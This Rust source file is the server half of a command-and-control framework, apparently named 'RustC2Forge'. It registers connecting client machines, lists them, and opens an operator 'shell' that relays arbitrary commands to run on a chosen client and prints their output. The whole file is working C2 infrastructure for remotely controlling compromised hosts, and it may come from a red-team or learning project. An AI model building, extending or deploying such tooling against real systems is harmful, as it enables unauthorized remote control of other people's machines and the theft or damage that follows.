use std::{io, process};
use std::error::Error;
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::time::Instant;

use crate::client::{ClientManager, ClientDetails, ClientConfig, ClientCommand};


/// Handles an individual client connection.
///
/// Upon receiving a connection, it first expects to receive an initial configuration from the client.
/// It then enters a loop where it waits for commands to execute on behalf of the client, sends these commands,
/// and handles their outputs. Commands and their outputs are managed via `ClientManager`.
///
/// # Parameters
///
/// * `stream`: The TCP stream associated with the connected client.
/// * `client_manager`: An instance of `ClientManager` to manage client details and commands.
pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
    let ip = stream.peer_addr().unwrap().to_string();
    let mut buffer = Vec::new();
    let mut reader = BufReader::new(&stream);

    // Initial configuration reception
    if let Ok(_) = reader.read_until(b'\n', &mut buffer) {

        match serde_json::from_slice::<ClientConfig>(&buffer) {
            Ok(config) => {
                client_manager.add_client(ip.clone(), ClientDetails {
                    config,
                    command: None,
                    last_heartbeat: Instant::now(),
                });
            },
            Err(e) => println!("[E] Failed to deserialize Client Config from \
                               {}: {}", ip, e),
        }
    }

    // Command processing loop
    loop {
        buffer.clear();
        let cmd: Option<String> = client_manager.get_command(&ip);
        if cmd != None {
            let cmd = cmd.unwrap();
            send_command(&stream, &cmd).unwrap();

            let command: ClientCommand = command_output(&mut reader).unwrap();
            println!("\n{}\n", command.output.unwrap());

            client_manager.reset_command(&ip).unwrap();
        }
    }
}

/// A server loop that continuously accepts commands from the console to manage clients.
///
/// Commands include listing clients, terminating the server session, and initiating shell sessions
/// with specific clients.
///
/// # Parameters
///
/// * `server_client_manager`: An instance of `ClientManager` used for client management.
pub fn cli_server(server_client_manager: ClientManager) {
    let mut cmd = String::new();
    println!("

    ██████╗ ██╗   ██╗███████╗████████╗ ██████╗██████╗ ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝╚════██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
    ██████╔╝██║   ██║███████╗   ██║   ██║      █████╔╝█████╗  ██║   ██║██████╔╝██║  ███╗█████╗
    ██╔══██╗██║   ██║╚════██║   ██║   ██║     ██╔═══╝ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
    ██║  ██║╚██████╔╝███████║   ██║   ╚██████╗███████╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝

                                                                                by Co3lho22

             ");

    loop {
        println!("C2 => ");
        io::stdout().flush().unwrap();

        cmd.clear();
        io::stdin().read_line(&mut cmd).expect("Failed to read command");
        cmd = cmd.trim_end().to_owned();

        commands(&cmd, &server_client_manager);
    }
}



/// Prints a help menu listing available commands.
///
/// This function displays a list of commands that the user can input, along with a brief
/// description of what each command does.
fn help() {
    let commands = r#"

List of available Commands:
----------------------------------------------------------------------------------------

help                           :    Shows available Commands

exit                           :    To terminate session

list-clients, lc               :    Lists all connected clients

shell                          :    Initiates a shell session with a specific client
                                   using its IP and port. To exit the shell, use the 'exit' command

"#;

    println!("{}", commands);
}


/// Initiates a shell session with a specific client.
///
/// Allows the user to interact directly with a chosen client by sending commands and receiving responses.
/// The function loops to accept commands until the user inputs 'exit'.
///
/// `ip`: IP and port of the client to connect to.
/// `server_client_manager`: Reference to the `ClientManager` for managing client commands.
fn shell(ip: String, server_client_manager: &ClientManager){
    println!(
        "\n------------------------------------------------------------\n\
        Welcome to the dedicated shell for client {}\n\
        ------------------------------------------------------------\n\
        You are now in a direct command line interface with the selected client machine.\n\
        Any commands you enter here will be executed on the client's machine,\n\
        and the output will be displayed in this shell.\n\
        Type 'exit' at any time to return to the main C2 Shell.\n",
        ip
    );

    let mut cmd = String::new();
    loop {
        let cmd_status: Option<String> = server_client_manager.get_command(&ip);

        // This waits for the command to be executed
        if cmd_status == None {
            println!("C2 {} => ", ip);
            io::stdout().flush().unwrap();

            cmd.clear();
            io::stdin().read_line(&mut cmd).unwrap();
            cmd = cmd.trim_end().to_owned();

            if cmd.is_empty() {
                continue
            }

            if cmd == "exit" {
                break
            }

            server_client_manager.update_command(&ip, cmd.clone());
        }
    }
}

/// Processes user input commands and executes corresponding actions.
///
/// Supports a range of commands for interacting with the server and managing
/// client sessions, such as displaying a help menu, listing connected clients,
/// and initiating shell sessions.
///
/// `cmd`: The user input command as a String.
/// `server_client_manager`: Reference to the `ClientManager` to update the
/// command that the client will run.
pub fn commands(cmd: &String, server_client_manager: &ClientManager) {
    match cmd.as_str() {
        "help" => help(),
        "exit" => {
            println!("Terminating session.");
            process::exit(0);
        },
        "list-clients" | "lc" => {
            let client_list: Vec<String> = server_client_manager.list_clients();
            println!("\nConnected Clients:\n");
            for client in client_list {
                println!("{}\n", client);
            }
        },
        "shell" => {
            println!("Enter the Client(Format: IP:PORT)");
            let mut ip = String::new();
            io::stdin().read_line(&mut ip).unwrap();
            ip = ip.trim_end().to_owned();

            if server_client_manager.client_exists(&ip) {
                shell(ip, server_client_manager);
            } else {
                println!("Client {} does not exist.", &ip);
            }
        },
        _ => println!("Unknown command. Type 'help' for a list of commands."),
    }
}





/// Sends a serialized command to the connected client via TCP stream.
///
/// Serializes a given command into JSON format and sends it to the client. It ensures
/// that the command is fully sent by flushing the stream.
///
/// # Parameters
///
/// * `stream`: A mutable reference to the TCP stream connected to the client.
/// * `cmd`: The command to send as a string.
///
/// # Returns
///
/// Returns an `io::Result<()>` indicating the success or failure of the operation.
///
/// # Errors
///
/// Returns an error if there is an issue with serializing the command or writing to the stream.
pub fn send_command(mut stream: &TcpStream, cmd: &String) -> io::Result<()> {
    let client_command = ClientCommand::new(cmd);

    let serialized_command = ClientCommand::to_json(&client_command).expect(
        "Failed to serialize command") + "\n";

    stream.write_all(serialized_command.as_bytes())?;
    stream.flush()?;

    Ok(())
}


/// Reads and deserializes the command output from the client.
///
/// Listens for command output from the connected client, deserializes the JSON
/// formatted message, and returns the `ClientCommand` struct containing the
/// command output.
///
/// # Parameters
///
/// * `reader`: A mutable reference to a `BufReader` wrapped around a TCP stream.
///
/// # Returns
///
/// Returns a `Result` which is either:
/// - `Ok(ClientCommand)`: The deserialized command output from the client.
/// - `Err(Box<dyn Error>)`: An error boxed as a trait object, if deserialization fails or
///   if there is an error reading from the stream.
pub fn command_output(reader: &mut BufReader<&TcpStream>)
                      -> Result<ClientCommand, Box<dyn Error>> {

    let mut buffer = Vec::new();
    match reader.read_until(b'\n', &mut buffer) {
        Ok(bytes_read) => {
            if bytes_read == 0 {
                println!("Connection closed inside command_output");
            }

            match serde_json::from_slice::<ClientCommand>(&buffer) {
                Ok(command_with_output) => Ok(command_with_output),
                Err(e) => {
                    println!("[E] Failed to deserialize command output: {}", e);
                    Err(Box::new(e))
                },
            }
        },
        Err(e) => {
            println!("[E] Failed to read from stream: {}", e);
            Err(Box::new(e))
        }
    }
}
